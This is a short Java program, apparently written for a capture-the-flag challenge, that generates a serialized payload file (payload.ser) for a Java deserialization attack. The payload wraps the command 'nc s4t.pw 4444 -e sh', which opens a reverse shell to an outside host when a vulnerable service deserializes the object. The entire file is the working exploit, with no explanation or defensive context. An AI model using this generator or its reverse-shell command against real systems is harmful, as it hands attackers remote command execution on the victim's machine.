import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import ctf.jargon.Exploit;

public class PayloadGen {
    public static void main(String[] args) throws Exception {
        Exploit e = new Exploit("nc s4t.pw 4444 -e sh");
        try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("payload.ser"))) {
            oos.writeObject(e);
        }
        System.out.println("wrote payload.ser");
    }
}